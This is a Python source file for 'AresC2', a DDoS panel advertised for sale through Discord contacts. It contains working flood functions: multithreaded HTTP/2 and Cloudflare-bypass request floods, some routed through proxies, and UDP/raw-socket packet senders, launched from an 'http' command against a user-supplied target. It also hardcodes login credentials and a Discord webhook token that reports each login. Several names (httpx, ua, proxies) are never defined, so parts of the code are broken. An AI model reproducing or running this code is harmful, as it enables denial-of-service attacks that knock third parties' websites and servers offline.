import random
import threading
import socket
import os,sys
import time
import getpass
from sys import stdout
from colorama import Fore, init
import cloudscraper, datetime, socket, ssl
        
from discord_webhook import DiscordWebhook, DiscordEmbed
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import datetime
import pytz

content = "Someone Just Login In AresC2"

webhook = DiscordWebhook(url="https://canary.discord.com/api/webhooks/1008349093568979004/https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2", content=content)

embed = DiscordEmbed(title=" :satellite: AresC2 Login Log :satellite:", color=0x2ecc71)

embed.set_timestamp()
embed.set_footer(text="©️ AresC2")
embed.add_embed_field(name='Welcome To AresC2', value='User __root__ is Now Logged in!')

webhook.add_embed(embed)
response = webhook.execute()

prot = (random.randint(2,4))
sys.stdout.write("\x1b]2;Ares C2 |  Online User : [{}] | Username: [-] | Devices : 89 | Expire : [UNLIMITED] \x07".format (prot))
        
os.system("clear")
print("""\033[93m
\033[93m
 █████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░  
            \033[93m>> \033[96mWelcome AresC2 Made By ItzSeven & Pushy \033[93m<<
            \033[97m
   ███
  █   █
\033[97m  █   █                     \033[93mWanna Buy? DM ItzSeven#9617 Or You Can DM
\033[97m█████████               ██  \033[93mPushyGamertag27#7165 make Sure You Join
\033[97m█████████              █  █ \033[93mTo Our Server https://discord.gg/Hjgp6FzVEA \033[97m
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m          
""")
username = str(input("\033[33m[AresC2] \033[93mUsername:\033[37m"))
password = str(input("\033[33m[AresC2] \033[93mPassword:\033[37m"))
if password == "rocker" and username == "cyon":
    print (f"\033[93mLogged in as {username}")
    time.sleep(2)

else:
    print ("\033[91mIncorrect Password. Please try again.")
    time.sleep(999)

os.system("clear")
rulesstart = str(input("""

        \033[95m╦═╗╦ ╦╦  ╔═╗╔═╗
        \033[97m╠╦╝║ ║║  ║╣ ╚═╗
        \033[95m╩╚═╚═╝╩═╝╚═╝╚═╝
\033[95m╔═══════════════════════════════════════════╗
\033[95m║\033[97m 1. No Attacks Over 120 Seconds.           \033[95m║
\033[95m║\033[97m 2. No Spamming Attacks.                   \033[95m║
\033[95m║\033[97m 3. No Attacks To Any Government Websites. \033[95m║
\033[95m║\033[97m 4. No Sharing Logins.                     \033[95m║
\033[95m║\033[97m 5. No Giving Out The Server IP.           \033[95m║
\033[95m║\033[97m 6. Dont Attacking .edu / .gov website     \033[95m║
\033[95m║\033[97m 7. Dont Share AresC2                      \033[95m║
\033[95m╚═══════════════════════════════════════════╝
\033[93m Do You Understand The Rules? [y/N] """))
if rulesstart == "y":
    print (f"\033[93m ")
    time.sleep(2)


else:
    print ("\033[91mREAD THE FUCKING RULES AGAIN")
    time.sleep(3)
    exit()


os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

nicknm = "Ares"

mt = """\033[96mService under \033[0;93mmaintance"""

start = """\033[92m
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
->                  |[_____]| 10%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start2 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
-->                 |[_____]| 20%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start3 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
--->                |[_____]| 30%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start4 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
---->               |[_____]| 40%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start5 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
----->              |[_____]| 50%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start6 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
------>             |[_____]| 60%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start7 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
------->            |[_____]| 70%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start8 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
-------->           |[_____]| 80%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start9 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
--------->          |[_____]| 90%
                    |[====o]|
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

start10 = """
                     _______ 
                    | ___  o|
                    |[_-_]_ |
                    |[_____]|
---------->         |[_____]| 100%
                    |[====o]| 
                    |[_.--_]|
                    |[_____]|
                    |______:|
"""

#custom methods
custom = """
\033[95m[\033[97m•\033[95m] \033[97mdstats-\033[95ml7
\033[95m[\033[97m•\033[95m] \033[97mdstats-\033[95ml4
"""
layer4 = """\033[97m\033[91m             ╦══╩══════════════0══════════════════╩══╦
\033[91m                        ▄▌   ▄▄▄·  ▄· ▄▌▄▄▄ .▄▄▄  
\033[91m                       ██•  ▐█ ▀█ ▐█▪██▌▀▄.▀·▀▄ █·
\033[31m                       ██▪  ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐▀▀▄ 
\033[91m                       ▐█▌▐▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌▐█•█▌
\033[91m                       .▀▀▀  ▀  ▀   ▀ •  ▀▀▀ .▀  ▀4
\033[91m             ╩══╦══════════════0══════════════════╦══╩
\033[91m      ╔═════════╩═════════════════════════════════╩═════════╗          
\033[91m                      udp        \033[97m[FREE] \033[97m(L4) (120)
\033[91m                      udp-down   \033[97m[FREE] \033[97m(L4) (120)
\033[91m                      udp-kill   \033[97m[FREE] \033[97m(L4) (120)
\033[91m                      syn        \033[97m[FREE] \033[97m(L4) (120)
\033[91m                      ovh        \033[97m[FREE] \033[97m(L4) (120)
\033[91m                      tcp        \033[97m[FREE] \033[97m(L4) (120)
\033[91m                      dns        \033[93m[VIP]  \033[97m(L4) (120)
\033[91m                      tcp-raw    \033[93m[VIP]  \033[97m(L4) (120)
\033[91m                      tcp-rape   \033[93m[VIP]  \033[97m(L4) (120)
\033[91m                      ovh-down   \033[93m[VIP]  \033[97m(L4) (120)
\033[91m                      udp-bypass \033[93m[VIP]  \033[97m(L4) (120)
\033[91m                      tcp-down   \033[93m[VIP]  \033[97m(L4) (120)
\033[91m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[91m             ╦══╩═════════════════════════════════╩══╦"""

methods = """
\033[91m                        ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[91m                        ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[91m                        ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[91m╔═════════════════════════════════════════════════════════
\033[91m║ udp        \033[97m[FREE] \033[97m(L4) (120)
\033[91m║ udp-down   \033[97m[FREE] \033[97m(L4) (120)
\033[91m║ syn        \033[97m[FREE] \033[97m(L4) (120)
\033[91m║ ovh        \033[97m[FREE] \033[97m(L4) (120)
\033[91m║ tcp        \033[97m[FREE] \033[97m(L4) (120)
\033[91m║ ovh-down   \033[93m[VIP]  \033[97m(L4) (120)
\033[91m║ udp-bypass \033[93m[VIP]  \033[97m(L4) (120)
\033[91m║ tcp-down   \033[93m[VIP]  \033[97m(L4) (120)
\033[91m╚═════════════════════════════════════════════════════════
\033[91m║ http-stm   \033[97m[FREE] \033[97m(L7) (120)
\033[91m║ home       \033[97m[FREE] \033[97m(L7) (120)
\033[91m║ cf         \033[97m[FREE] \033[97m(L7) (120)
\033[91m║ http       \033[97m[FREE] \033[97m(L7) (120)
\033[91m║ ovh        \033[97m[FREE] \033[97m(L7) (120)
\033[91m║ stresster  \033[97m[FREE] \033[97m(L7) (120)
\033[91m║ http-cld   \033[93m[VIP]  \033[97m(L7) (120)
\033[91m║ cfb        \033[93m[VIP]  \033[97m(L7) (120)
\033[91m║ ddos-guard \033[93m[VIP]  \033[97m(L7) (120)
\033[91m║ ovh-down   \033[93m[VIP]  \033[97m(L7) (120)
\033[91m╚═════════════════════════════════════════════════════════
"""

ticket = """\033[96m For Ticket You Can Join Our Discord Server. \033[93mhttps://discord.aresnet.xyz/"""

banner =  """\033[97m|\033[95mAresC2\033[97m| \033[91m| VIP ACSESS\033[97m: [\033[92mTRUE\033[97m] |  \033[91mDISCORD\033[97m: [\033[92mItzSeven#3217\033[97m] \033[97m| \033[91mNew Design, Enjoy!~

\033[95m                     ▄▄▄· ▄▄▄  ▄▄▄ ..▄▄ · 
\033[95m                    ▐█ ▀█ ▀▄ █·▀▄.▀·▐█ ▀. 
\033[97m                    ▄█▀▀█ ▐▀▀▄ ▐▀▀▪▄▄▀▀▀█▄
\033[95m                    ▐█ ▪▐▌▐█•█▌▐█▄▄▌▐█▄▪▐█
\033[95m                     ▀  ▀ .▀  ▀ ▀▀▀  ▀▀▀▀ 
\033[95m              \033[91m♥ \033[95mARES C2 MADE BY ItzSeven \033[91m♥
\033[95m        ══╦═════════════════════════════════╦══
\033[95m╔═════════╩═════════════════════════════════╩═════════╗
\033[95m║              \033[97mWelcome To AresC2                      \033[95m║
\033[95m║ \033[97mType "help" \033[97mFor Help . If you wanna buy AresC2      \033[95m║
\033[95m║ \033[97mContact ItzSeven#3217 / PushyGamertag27#7165        \033[95m║
\033[95m╚═══╦════════════════════════════════════════════╦════╝
\033[95m   ╔╩════════════════════════════════════════════╩╗
\033[95m   ║ How To attack: \033[95m[\033[97mMETHOD\033[95m] \033[95m[\033[97mIP\033[95m] \033[95m[\033[97mTIME\033[95m] [\033[97mPORT\033[95m].  ║
\033[95m   ║ \033[97mCopyrigtht © AresC2 2022 All Rights Reserved \033[95m║
\033[95m   ╚══════════════════════════════════════════════╝
"""

attacked =  """\033[97m[INFO] Attack Was Success!!"""


helpservice =  """\033[95m             ╦══╩══════════════0══════════════════╩══╦
    \033[95m                     ▄ .▄▄▄▄ .▄▄▌   ▄▄▄·
    \033[95m                    ██▪▐█▀▄.▀·██•  ▐█ ▄█
    \033[97m                    ██▀▐█▐▀▀▪▄██▪   ██▀·
    \033[95m                    ██▌▐▀▐█▄▄▌▐█▌▐▌▐█▪·•
    \033[95m                    ▀▀▀ · ▀▀▀ .▀▀▀ .▀   
\033[95m             ╩══╦══════════════0══════════════════╦══╩
\033[95m      ╔═════════╩═════════════════════════════════╩═════════╗
\033[95m    
\033[95m         layer7               : \033[97mShow Layer7 Command
\033[95m         Layer4               : \033[97mShow Layer4 Command
\033[95m         vip                  : \033[97mShow VIP Command
\033[95m         methods              : \033[97mShow All Methods in AresC2
\033[95m         plant                : \033[97mShow Your Plant
\033[95m         rules                : \033[97mShow Rules
\033[95m    
\033[95m                   \033[93mϟ  \033[97mMade By : ItzSeven \033[93mϟ 
\033[95m                             
\033[95m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[95m             ╦══╩═════════════════════════════════╩══╦
\033[97m            Copyrigtht © AresC2 2022 All Rights Reserved
\033[95m             ╩═══════════════════════════════════════╩"""

layer7 = """\033[97m
\033[91m             ╦══╩══════════════0══════════════════╩══╦
\033[91m                        ▄▌   ▄▄▄·  ▄· ▄▌▄▄▄ .▄▄▄  
\033[91m                       ██•  ▐█ ▀█ ▐█▪██▌▀▄.▀·▀▄ █·
\033[31m                       ██▪  ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐▀▀▄ 
\033[91m                       ▐█▌▐▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌▐█•█▌
\033[91m                       .▀▀▀  ▀  ▀   ▀ •  ▀▀▀ .▀  ▀7
\033[91m             ╩══╦══════════════0══════════════════╦══╩
\033[91m      ╔═════════╩═════════════════════════════════╩═════════╗          
\033[91m            http-stm   \033[97m[FREE] \033[97m(L7) (120)
\033[91m            home       \033[97m[FREE] \033[97m(L7) (120)
\033[91m            cf         \033[97m[FREE] \033[97m(L7) (120)
\033[91m            http       \033[97m[FREE] \033[97m(L7) (120)
\033[91m            ovh        \033[97m[FREE] \033[97m(L7) (120)
\033[91m            stresster  \033[97m[FREE] \033[97m(L7) (120)
\033[91m            http-cld   \033[93m[VIP]  \033[97m(L7) (120)
\033[91m            cfb        \033[93m[VIP]  \033[97m(L7) (120)
\033[91m            ddos-guard \033[93m[VIP]  \033[97m(L7) (120)
\033[91m            ovh-down   \033[93m[VIP]  \033[97m(L7) (120)
\033[91m            attack     \033[93m[VIP]  \033[97m(L7) (60)
\033[91m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[91m             ╦══╩═════════════════════════════════╩══╦
"""

cooldown = """
\033[0;96m      
\033[0;96m                               LOADING FOR MINUTES       
\033[0;96m                              
\033[0;96m =============Akashv CREATED THIS DDOS======================"""
invalid = """\033[0;96mInvalid\033[0;93mCommands"""
cookie = open(".sinfull_cookie","w+")

loading = """\033[93m
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Loading...     |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
"""

loading2 = """\033[93m
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Loading..      |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
"""

loading3 = """\033[93m
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Loading.       |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
"""

wait = """


         -=\`\
     |\ ____\_\__
   -=\c`""""""" "`)
      `~~~~~/ /~~`
        -==/ /
          '-'
"""
wait2 = """


             -=\`\
         |\ ____\_\__
       -=\c`""""""" "`)
          `~~~~~/ /~~`
            -==/ /
              '-'
"""
wait3 = """


                 -=\`\
             |\ ____\_\__
           -=\c`""""""" "`)
              `~~~~~/ /~~`
                -==/ /
                  '-'
"""
wait4 = """


                     -=\`\
                 |\ ____\_\__
               -=\c`""""""" "`)
                  `~~~~~/ /~~`
                    -==/ /
                      '-'
"""

plan =  f"""
\033[0;93m VIP = \033[92mTRUE
\033[0;93m USERNAME = \033[92m{username}                
\033[0;93m ADMIN = \033[92mTRUE
\033[0;93m EXPIRED TIME = \033[92mNEVER
\033[0;93m API ACCESS = \033[92mTRUE
"""

welcome = """
    o       o 
    |`.   .´| 
    |  \O/  | 
    |   |   | 
    |  / \  | 
    |.'   '.| 
    "       " 
"""

welcome2 = """
    o       o 
    |:     ;| 
    | '   ' | 
    |       | 
    |       | 
    |.·   ·.| 
    "       " 
"""

welcome3 = """
    o       o 
    |:     ;| 
    |'     '| 
    |       | 
    |       | 
    | .   . | 
    "´     `" 

"""

welcome4 = """
    o       o 
    |;     :| 
    ´       ` 
    |       | 
    |       | 
    |       | 
    "'·   ·'" 
"""

welcome5 = """
    o       o 
    |:     :| 
    |'     '| 
    |       | 
    |       | 
    |       | 
    ":     :" 
"""

send1 = """
      )
     (
    .-`-.
    :   :
    :TNT:
    :___:
"""

send2 = """
    \|/
   - o -
    /-`-.
    :   :
    :TNT:
    :___:
"""

send3 = """
    .---.
    : | :
    :-o-:
    :_|_:
"""

send4 = """
    .---.
    (\|/)
    --0--
    (/|\)
"""

send5 = """
   '.\|/.'
   (\   /)
   - -O- -
   (/   \)
   ,'/|\'.
"""

send6 = """
'.  \ | /  ,'
  `. `.' ,'
 ( .`.|,' .)
 - ~ -0- ~ -
 ( . . . . )
"""

send7 = """

','|'.` )
  .' .'. '.
,'  / | \  '.
    \ '  "  
 ` . `.' ,'
 . `` ,'. "
   ~ (   ~ -
'
"""

send8 = """

. ','|` ` .
  .'  "  '
,   ' , '  `

   (  ) (
    ) ( )
    (  )
     ) /
    ,---.
"""

pov = """\033[92m
         _nnnn_                      
        dGGGGMMb     ,**************.
       @p~qp~~qMb    | Dont Skid Plz |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'     \033[92mLoading Commands [\033[97m•\033[92m]
"""


pov2 = """
         _nnnn_                      
        dGGGGMMb     ,**************.
       @p~qp~~qMb    | Dont Skid Plz |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'     \033[92mLoading Commands [\033[97m••\033[92m] 
"""


pov3 = """
         _nnnn_                      
        dGGGGMMb     ,**************.
       @p~qp~~qMb    | Dont Skid Plz |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'     \033[92mLoading Commands [\033[97m•••\033[92m] 
"""


pov4 = """
         _nnnn_                      
        dGGGGMMb     ,**************.
       @p~qp~~qMb    | Dont Skid Plz |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'     \033[92mLoading Commands [\033[97m••\033[92m] 
"""


pov5 = """
         _nnnn_                      
        dGGGGMMb     ,**************.
       @p~qp~~qMb    | Dont Skid Plz |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'     \033[92mLoading Commands [\033[97m•\033[92m] 
"""

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

def get_info():
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.WHITE)
    target = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.WHITE)
    thread = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.WHITE)
    t = input()
    return target, thread, t
#endregion


def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

rules = """
\033[95m╔═══════════════════════════════════════════╗
\033[95m║\033[97m 1. No Attacks Over 120 Seconds.           \033[95m║
\033[95m║\033[97m 2. No Spamming Attacks.                   \033[95m║
\033[95m║\033[97m 3. No Attacks To Any Government Websites. \033[95m║
\033[95m║\033[97m 4. No Sharing Logins.                     \033[95m║
\033[95m║\033[97m 5. No Giving Out The Server IP.           \033[95m║
\033[95m╚═══════════════════════════════════════════╝
"""

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass


fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

    while True:
        powerran = (random.randint(1,3))
        sys.stdout.write("\x1b]2;Ares C2 | Online User : [{}] | Username: [root] | Devices : 89 | Expire : [UNLIMITED] \x07".format (powerran))
        sin = input("\033[95m[\033[97mroot@Ares\033[95m]\033[97m~$ \033[37m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]

        if sinput == "clear":
            os.system ("clear")
            print(pov)
            time.sleep(1)
            os.system ("clear")
            print(pov2)
            time.sleep(1)
            os.system ("clear")
            print(pov3)
            time.sleep(1)
            os.system ("clear")
            print(pov4)
            time.sleep(1)
            os.system ("clear")
            print(pov5)
            time.sleep(1)
            os.system("clear")
            print (banner)
            main()

        elif sinput == "http" or sinput == "HTTP":
           target, thread, t = get_info()
           timer = threading.Thread(target=countdown, args=(t,))
           timer.start()
           LaunchHTTP2(target, thread, t)

           timer.join()


        if sinput == "rules":
            print(rules)
        if sinput == "custom-methods":
            os.system("clear")
            print (custom)
        if sinput == "methods":
            os.system ("clear")
            print (wait)
            time.sleep(2)
            os.system ("clear")
            print (wait2)
            time.sleep(2)
            os.system ("clear")
            print (wait3)
            time.sleep(2)
            os.system ("clear")
            print (wait4)
            time.sleep(2)
            os.system("clear")
            print (methods)
            main()
        if sinput == "method":
            os.system ("clear")
            print (wait)
            time.sleep(2)
            os.system ("clear")
            print (wait2)
            time.sleep(2)
            os.system ("clear")
            print (wait3)
            time.sleep(2)
            os.system ("clear")
            print (wait4)
            time.sleep(2)
            os.system("clear")
            print (methods)
            main()
        if sinput == "ticket":
            os.system ("clear")
            print (ticket)
            main()
        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "?":
            os.system ("clear")
            print (helpservice)
            main()
        elif sinput == "help":
            os.system('clear')
            print (loading)
            time.sleep(2)
            os.system('clear')
            print (loading2)
            time.sleep(2)
            os.system('clear')
            print (loading3)
            time.sleep(2)
            os.system ('clear')
            print (helpservice)
            main()
        elif sinput == "":
            print(invalid)
            main()
        if sinput == "plant":
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome)
